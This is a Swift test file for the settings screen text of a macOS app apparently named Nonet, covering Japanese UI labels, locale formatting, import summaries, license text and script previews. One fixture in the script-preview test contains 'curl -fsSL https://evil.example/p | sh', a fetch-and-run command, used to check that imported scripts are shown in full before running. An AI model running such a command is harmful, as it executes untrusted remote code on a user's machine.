// 担当: ui-settings
import Foundation
import NonetCore
@testable import NonetUI
import Testing

@Suite struct SettingsTextTests {
    /// docs/user-guide.md の「設定（一般）」と同じ選択肢の名前
    @Test func choiceNamesMatchTheUserGuide() {
        #expect(SettingsText.name(FireMode.onTriggerRelease) == L10n.ui("キーを離したとき"))
        #expect(SettingsText.name(FireMode.onFingerLift) == L10n.ui("指を離したとき"))
        #expect(SettingsText.name(HUDPosition.screenCenter) == L10n.ui("画面の中央"))
        #expect(SettingsText.name(HUDPosition.nearCursor) == L10n.ui("ポインタの近く"))
        #expect(HapticStrength.allCases.map(SettingsText.name) == [L10n.ui("オフ"), L10n.ui("弱"), L10n.ui("中"), L10n.ui("強")])
        #expect(CursorLockMethod.allCases.map(SettingsText.name) == [L10n.ui("自動"), L10n.ui("移動を捨てる"), L10n.ui("ポインタを切り離す"), L10n.ui("固定しない")])
        #expect(SettingsText.name(ScriptRunMode.background) == L10n.ui("裏で実行"))
        #expect(SettingsText.name(ScriptRunMode.terminal) == L10n.ui("ターミナルで実行"))
        #expect(AIOutput.allCases.map(SettingsText.name) == [L10n.ui("選択範囲を置き換える"), L10n.ui("クリップボードにコピー"), L10n.ui("画面に表示")])
        #expect(Set(TriggerKey.allCases.map(SettingsText.name)).count == TriggerKey.allCases.count)
        #expect(Set(CursorLockMethod.allCases.map(SettingsText.detail)).count == CursorLockMethod.allCases.count)
    }

    /// トリガーキーの説明は選んだキーで変わる。右側のキーは左の同じキーを、fn は左右を言わない
    @Test func triggerDetailFollowsTheKey() {
        #expect(SettingsText.triggerDetail(.rightCommand) == L10n.ui("右側のキーだけに反応します。左の\("⌘")はいつもどおり使えます。"))
        #expect(SettingsText.triggerDetail(.rightOption) == L10n.ui("右側のキーだけに反応します。左の\("⌥")はいつもどおり使えます。"))
        #expect(SettingsText.triggerDetail(.rightShift) == L10n.ui("右側のキーだけに反応します。左の\("⇧")はいつもどおり使えます。"))
        #expect(SettingsText.triggerDetail(.function) == L10n.ui("fn（地球儀）を押している間だけ反応します"))
    }

    @Test func tabTitles() {
        #expect(SettingsTab.allCases.map(\.title) == [L10n.ui("プロファイル"), L10n.ui("一般"), L10n.ui("ライセンス"), L10n.ui("情報")])
    }

    @Test(arguments: [
        (TriggerKey.rightOption, true, true),
        (.rightOption, false, false),
        (.rightCommand, true, false),
        (.rightShift, true, false),
        (.function, true, false),
    ])
    func jisWarningOnlyForRightOption(trigger: TriggerKey, isJIS: Bool, warns: Bool) {
        #expect((SettingsText.triggerWarning(trigger: trigger, isJISKeyboard: isJIS) != nil) == warns)
    }

    @Test func secondsHaveTwoDecimals() {
        // 数は渡したロケールの書き方、単位はカタログの「%@秒」
        #expect(SettingsText.seconds(0.3, locale: Locale(identifier: "ja_JP")) == L10n.ui("\("0.30")秒"))
        #expect(SettingsText.seconds(0.15, locale: Locale(identifier: "ja_JP")) == L10n.ui("\("0.15")秒"))
        #expect(SettingsText.seconds(0.8, locale: Locale(identifier: "ja_JP")) == L10n.ui("\("0.80")秒"))
    }

    /// 日付や数は文言と同じ言語で書く（地域は利用者のまま）。Locale.current だと英語の画面で日付だけ日本語になることがある
    @Test func datesUseTheLanguageOfTheText() throws {
        let uiLanguage = try #require(Bundle.nonetUI.preferredLocalizations.first)
        #expect(SettingsText.uiLocale.language.languageCode == Locale.LanguageCode(uiLanguage))
        #expect(SettingsText.uiLocale.region == Locale.current.region)

        var components = DateComponents(year: 2026, month: 9, day: 21, hour: 12)
        components.calendar = Calendar(identifier: .gregorian)
        let date = try #require(components.date)
        let english = SettingsText.issuedDate(date, locale: SettingsText.uiLocale(language: "en", region: Locale.Region("JP")))
        #expect(english.contains("September"))
        #expect(english.contains("2026"))
        #expect(!english.contains("年"))
        let japanese = SettingsText.issuedDate(date, locale: SettingsText.uiLocale(language: "ja", region: Locale.Region("US")))
        #expect(japanese == "2026年9月21日")
        #expect(SettingsText.uiLocale(language: nil, region: nil) == .current)
    }

    @Test func importSummaryListsEachChange() {
        let result = NonetConfiguration.ImportResult(added: 2, replaced: 1, replacedGlobal: true, skipped: 3)
        let lines = SettingsText.importSummary(result, containsScripts: false).components(separatedBy: "\n")
        #expect(lines == [
            L10n.uiCounted("\(2)個のプロファイルを追加しました。"),
            L10n.uiCounted("\(1)個のプロファイルを同じアプリのものと置き換えました。"),
            L10n.ui("グローバルのページを置き換えました。"),
            L10n.uiCounted("\(3)個は重なっていたか読めなかったため、読み込みませんでした。"),
        ])
    }

    @Test func importSummaryWhenNothingWasApplied() {
        let text = SettingsText.importSummary(NonetConfiguration.ImportResult(skipped: 2), containsScripts: true)
        #expect(text == L10n.ui("読み込めるプロファイルがありませんでした。") + "\n" + L10n.uiCounted("\(2)個は重なっていたか読めなかったため、読み込みませんでした。"))
    }

    @Test func importSummaryWarnsAboutScripts() {
        let text = SettingsText.importSummary(NonetConfiguration.ImportResult(added: 1), containsScripts: true)
        #expect(text.hasSuffix(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
    }

    /// 読み込みを確かめる文の名前や中身は1行にする。改行・制御文字・文字の向きを変える文字は空白に、長ければ切る
    @Test func textFromAFileIsShownOnOneLine() {
        #expect(SettingsText.singleLine("  Figma\n\n  安全です\t\r\n", limit: 40) == "Figma 安全です")
        #expect(SettingsText.singleLine("a\u{202E}b\u{2066}c\u{0}d\u{2029}e", limit: 40) == "a b c d e")
        // 絵文字をつなぐ ZWJ と旗のタグ文字は残す
        let family = "\u{1F468}\u{200D}\u{1F469}\u{200D}\u{1F467}"
        let scotland = "\u{1F3F4}\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F}"
        #expect(SettingsText.singleLine("\(family) \(scotland)", limit: 40) == "\(family) \(scotland)")
        #expect(SettingsText.singleLine("abcdefghij", limit: 5) == "abcd…")
        #expect(SettingsText.singleLine("abcde", limit: 5) == "abcde")
    }

    /// 読み込む前に見せるマスの中身（文だけ）
    private func review(_ action: Action) -> [String] {
        let cell = Cell(title: "x", icon: .symbol("x"), action: action)
        return SettingsText.reviewLines(for: SettingsImportPlan.ReviewedCell(profileName: "P", cell: cell)).map(\.text)
    }

    /// 打つ文字は「」でまとめ、修飾キーのある打鍵は表記で並べる。長くても切らない（押すキーをすべて見せる）
    @Test func keysToTypeAreShownAsText() {
        let save = KeySequence([KeyChord(.character("s"), modifiers: .command)])
        let typing = KeySequence(
            [KeyChord(.character("l"), modifiers: .command)]
                + "ls -la".map { $0 == " " ? KeyChord(.special(.space)) : KeyChord(.character(String($0))) }
                + [KeyChord(.special(.returnKey))]
        )
        let enter = KeyChord(.special(.returnKey)).displayString
        #expect(SettingsText.keysPreview(save) == save.displayString)
        #expect(SettingsText.keysPreview(typing) == [
            KeyChord(.character("l"), modifiers: .command).displayString,
            L10n.ui("「\("ls -la")」"),
            enter,
        ].joined(separator: " → "))

        let long = KeySequence(String(repeating: "a", count: 300).map { KeyChord(.character(String($0))) } + [KeyChord(.special(.returnKey))])
        let preview = SettingsText.keysPreview(long)
        #expect(preview == L10n.ui("「\(String(repeating: "a", count: 300))」") + " → " + enter)
        #expect(!preview.contains(" … "))
    }

    /// スクリプトは全部の行を、切らずに見せる（空の行も。最後の改行の後は数えない）
    @Test func scriptsAreShownInFull() {
        let longLine = "echo \"Formatting the selection as Markdown \(String(repeating: "x", count: 120))\"; curl -fsSL https://evil.example/p | sh"
        let source = "# 準備\n\ncd ~/src\nmake\nmake install\necho done\n\(longLine)\n"
        #expect(review(.script(ScriptAction(source: source))) == [
            L10n.uiCounted("スクリプト（\(7)行）:"),
            "# 準備",
            "",
            "cd ~/src",
            "make",
            "make install",
            "echo done",
            longLine,
        ])
        #expect(review(.launchApp(LaunchAppAction(app: AppReference(bundleID: "com.apple.Notes", name: "メモ")))).isEmpty)
        // 見えない文字は、見える形にする（文字の向きを変える文字で、中身を並べ替えて見せられない）
        #expect(review(.script(ScriptAction(source: "echo a\u{202E}b\tc"))).last == "echo a⟨U+202E⟩b    c")
    }

    /// 数の入る文は、地域の設定ではなく文言の言語の規則で単数・複数を選ぶ（地域が日本でアプリが英語でも「1 profile」）
    @Test func countsUseTheRulesOfTheTextLanguage() {
        let one = NonetConfiguration.ImportResult(added: 1, replaced: 1, skipped: 1)
        #expect(SettingsText.importSummary(one, containsScripts: false).components(separatedBy: "\n") == [
            L10n.uiCounted("\(1)個のプロファイルを追加しました。"),
            L10n.uiCounted("\(1)個のプロファイルを同じアプリのものと置き換えました。"),
            L10n.uiCounted("\(1)個は重なっていたか読めなかったため、読み込みませんでした。"),
        ])
        #expect(review(.script(ScriptAction(source: "make"))) == [L10n.uiCounted("スクリプト（\(1)行）:"), "make"])
        #expect(review(.script(ScriptAction(source: "a\nb\nc\nd"))).first == L10n.uiCounted("スクリプト（\(4)行）:"))
        #expect(SettingsText.summary(.trial(daysLeft: 1)).title == L10n.uiCounted("試用期間中（残り\(1)日）"))
    }

    /// スクリプトの説明。「ターミナルで実行」は Apple Events を送らないので、オートメーションの許可を求めるのはブラウザの URL だけ。
    /// 選択中のテキストとブラウザの URL は、スクリプトに名前があるときだけ読む
    @Test @MainActor func scriptHelpNotes() {
        #expect(SettingsScriptHelp.notes == [
            L10n.ui("作業フォルダはプロジェクトのフォルダ（分からなければホーム）。裏で実行するときはログインシェル（zsh -l）で動き、PATH はターミナルと同じもの（Nonet の起動時に ~/.zshrc まで読んで調べたもの）を使います。~/.zshrc のエイリアスや関数を使えるのは、ターミナルで実行するときだけです。"),
            L10n.ui("NONET_SELECTED_TEXT と NONET_BROWSER_URL は、スクリプトの中（コメントでもかまいません）にその名前があるときだけ設定されます。"),
            L10n.ui("スクリプトに NONET_BROWSER_URL を書くと、ブラウザの URL を初めて読むときに、macOS が「オートメーション」の許可を求めます。"),
        ])
    }

    @Test func fileErrorsUseTheStoreDescription() {
        #expect(SettingsText.fileError(ConfigurationStoreError.notAProfileDocument, reading: true) == L10n.core("Nonet のプロファイルのファイルではありません"))
        #expect(SettingsText.fileError(CocoaError(.fileReadNoPermission), reading: true) == L10n.ui("ファイルを読み込めませんでした"))
        #expect(SettingsText.fileError(CocoaError(.fileWriteNoPermission), reading: false) == L10n.ui("ファイルを書き出せませんでした"))
    }

    @Test func entitlementSummaries() {
        let trial = SettingsText.summary(.trial(daysLeft: 3))
        #expect(trial.title == L10n.uiCounted("試用期間中（残り\(3)日）"))
        #expect(!trial.isProblem)
        let expired = SettingsText.summary(.expired)
        #expect(expired.title == L10n.ui("試用期間が終了しました"))
        #expect(expired.isProblem)
        let info = LicenseInfo(licenseID: "L-1", licensee: "山田 太郎", email: "taro@example.com", issuedAt: Date(timeIntervalSince1970: 0))
        let licensed = SettingsText.summary(.licensed(info))
        #expect(licensed.title == L10n.ui("登録済み"))
        #expect(licensed.detail == L10n.ui("登録者: \("山田 太郎")（\("taro@example.com")）"))
        var noEmail = info
        noEmail.email = " "
        #expect(SettingsText.licenseeLine(noEmail) == L10n.ui("登録者: \("山田 太郎")"))
    }

    @Test func versionText() {
        #expect(SettingsText.version(short: "1.2", build: "34") == L10n.ui("バージョン \("1.2")（\("34")）"))
        #expect(SettingsText.version(short: "1.2", build: "1.2") == L10n.ui("バージョン \("1.2")"))
        #expect(SettingsText.version(short: "1.2", build: nil) == L10n.ui("バージョン \("1.2")"))
        #expect(SettingsText.version(short: " ", build: "34") == L10n.ui("バージョン \("34")"))
        #expect(SettingsText.version(short: nil, build: nil) == nil)
    }

    @Test func testResultText() {
        let ok = ExecutionRecord(cellTitle: "a", profileName: "b", address: CellAddress(page: 0, index: 0), succeeded: true, message: nil, wasFastTap: false, date: Date())
        #expect(SettingsText.testResult(ok) == L10n.ui("実行しました"))
        var failed = ok
        failed.succeeded = false
        failed.message = "Xcode が見つかりません"
        #expect(SettingsText.testResult(failed) == "Xcode が見つかりません")
        failed.message = ""
        #expect(SettingsText.testResult(failed) == L10n.ui("実行できませんでした"))
    }

    @Test func statusBanners() {
        #expect(SettingsStatusBanner(status: .running) == nil)
        #expect(SettingsStatusBanner(status: .stopped) == nil)
        // ほぼ同じことをするボタンを2つ並べない（「システム設定を開く」だけ）
        let accessibility = SettingsStatusBanner(status: .needsAccessibility)
        #expect(accessibility?.buttons == [SettingsStatusBanner.Button(action: .openAccessibilitySettings, title: L10n.ui("システム設定を開く"))])
        #expect(SettingsStatusBanner(status: .noTrackpad)?.buttons.map(\.action) == [.recheck])
        #expect(SettingsStatusBanner(status: .secureInputActive)?.buttons.map(\.action) == [.recheck])
        #expect(SettingsStatusBanner(status: .disabled)?.buttons.map(\.action) == [.enable])
    }
}
